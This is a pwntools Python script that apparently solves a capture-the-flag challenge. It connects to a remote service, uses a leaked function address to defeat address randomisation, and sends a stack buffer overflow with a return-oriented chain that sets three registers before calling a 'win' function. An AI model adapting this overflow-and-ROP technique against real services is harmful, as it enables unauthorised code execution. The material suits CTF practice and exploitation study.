import os
import dotenv

os.chdir(os.path.dirname(__file__))
config = dotenv.dotenv_values()
nc, host, port = config["CONNECT"].split(" ")
assert nc == "nc" and host and port.isnumeric()

from pwn import remote

conn = remote(host, port)

conn.recvuntil(b": ")
win_addr = int(conn.recvline().strip(), 16)
base_addr = win_addr - 0x11EF
data = b"A" * 72

# rdi
data += (base_addr + 0x11E9).to_bytes(8, "little")
data += 0xDEADBEEFCAFEBABE.to_bytes(8, "little")

# rsi
data += (base_addr + 0x11EB).to_bytes(8, "little")
data += 0x1122334455667788.to_bytes(8, "little")

# rdx
data += (base_addr + 0x11ED).to_bytes(8, "little")
data += 0xABCDABCDABCDABCD.to_bytes(8, "little")

data += (win_addr).to_bytes(8, "little")
data += b"\n"

conn.send(data)

conn.interactive()
